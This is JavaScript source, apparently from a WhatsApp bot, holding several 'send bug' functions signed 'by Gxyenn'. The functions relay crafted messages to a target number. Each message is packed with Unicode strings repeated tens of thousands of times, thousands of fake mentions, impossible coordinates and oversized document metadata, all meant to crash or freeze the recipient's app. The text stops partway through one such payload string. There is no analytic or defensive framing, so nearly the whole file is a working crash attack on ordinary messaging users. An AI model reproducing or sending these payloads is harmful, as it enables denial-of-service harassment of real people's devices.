  //FUNCTION ABAL ABAL  by Gxyenn 🗿
    async function LocSystem(target) {
            let virtex = "⿻ 🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉҉n҉ X̷l̷e̷s̷y̷V̷I̷P ⿻";
            let memekz = Date.now();

            await Xlesy.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                locationMessage: {
                                    degreesLatitude: -999.03499999999999,
                                    degreesLongitude: 999.03499999999999
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "" + "ꦾ".repeat(50000) + "@X".repeat(90000) + "𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭".repeat(90000) + "ᬃᬃ".repeat(90000) + "⿻".repeat(90000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "AngeLs`" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });            
        };
  async function f10(target, Ptcp = false) {
    await Xlesy.relayMessage(target, {
      extendedTextMessage: {
        text: "`🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉҉n҉ X̷l̷e̷s̷y̷V̷I̷P`\n>  ͆ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺\n" + "ી".repeat(55000),
        contextInfo: {
          mentionedJid: ["6283877636168@s.whatsapp.net", ...Array.from({
            length: 15000
          }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")],
          stanzaId: "1234567890ABCDEF",
          participant: "6283877636168@s.whatsapp.net",
          quotedMessage: {
            callLogMesssage: {
              isVideo: false,
              callOutcome: "5",
              durationSecs: "999",
              callType: "REGULAR",
              participants: [{
                jid: "62895329013688@s.whatsapp.net",
                callOutcome: "5"
              }]
            }
          },
          remoteJid: target,
          conversionSource: " X ",
          conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
          conversionDelaySeconds: 10,
          forwardingScore: 10,
          isForwarded: false,
          quotedAd: {
            advertiserName: " X ",
            mediaType: "IMAGE",
            jpegThumbnail: fs.readFileSync("./lib/media/image/Gxyenn.png"),
            caption: " X "
          },
          placeholderKey: {
            remoteJid: "0@s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          },
          expiration: 86400,
          ephemeralSettingTimestamp: "1728090592378",
          ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
          externalAdReply: {
            title: "‎᭎ᬼᬼᬼৗীি𑍅𑍑\n⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿\n𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿",
            body: "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠",
            mediaType: "VIDEO",
            renderLargerThumbnail: true,
            previewType: "VIDEO",
            thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
            sourceType: " x ",
            sourceId: " x ",
            sourceUrl: "x",
            mediaUrl: "x",
            containsAutoReply: true,
            showAdAttribution: true,
            ctwaClid: "ctwa_clid_example",
            ref: "ref_example"
          },
          entryPointConversionSource: "entry_point_source_example",
          entryPointConversionApp: "entry_point_app_example",
          entryPointConversionDelaySeconds: 5,
          disappearingMode: {},
          actionLink: {
            url: "‎ ‎ "
          },
          groupSubject: " X ",
          parentGroupJid: "6287888888888-1234567890@g.us",
          trustBannerType: " X ", 
          trustBannerAction: 1,
          isSampled: false,
          utm: {
            utmSource: " X ",
            utmCampaign: " X "
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: "6287888888888-1234567890@g.us",
            serverMessageId: 1,
            newsletterName: " X ",
            contentType: "UPDATE",
            accessibilityText: " X "
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net"
          },
          smbClientCampaignId: "smb_client_campaign_id_example",
          smbServerCampaignId: "smb_server_campaign_id_example",
          dataSharingContext: {
            showMmDisclosure: true
          }
        }
      }
    }, Ptcp ? {
      participant: {
        jid: target
      }
    } : {});
console.log(chalk.red.bold('🔐 X̷l̷e̷s̷y̷V̷I̷P̷ 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠'))
};


async function XeonXRobust(target, Ptcp = true) {
  const jids = `_*~@0~*_\n`.repeat(10200);
  const ui = "ꦽ".repeat(10000);
  await Xlesy.relayMessage(target, {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n ҉X̷l̷e̷s̷y̷V̷I̷P̷",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: "https://files.catbox.moe/540elt.jpg"
            },
            hasMediaAttachment: true
          },
          body: {
            text: "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n ҉X̷l̷e̷s̷y̷V̷I̷P̷" + ui + jids
          },
          contextInfo: {
            mentionedJid: ["0@s.whatsapp.net"],
            mentions: ["0@s.whatsapp.net"]
          },
          footer: {
            text: ""
          },
          nativeFlowMessage: {},
          contextInfo: {
            mentionedJid: ["0@s.whatsapp.net", ...Array.from({
              length: 30000
            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n ҉X̷l̷e̷s̷y̷V̷I̷P̷",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: ""
              }
            }
          }
        }
      }
    }
  }, Ptcp ? {
    participant: {
      jid: target
    }
  } : {});
}
        async function thunderblast_doc(target) {
    const messagePayload = {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "999999999999",
                                pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: `Undefined`,
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1715880173"
                            },
                        hasMediaAttachment: true
                    },
                    body: {
                            text: "\u0000" + "⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴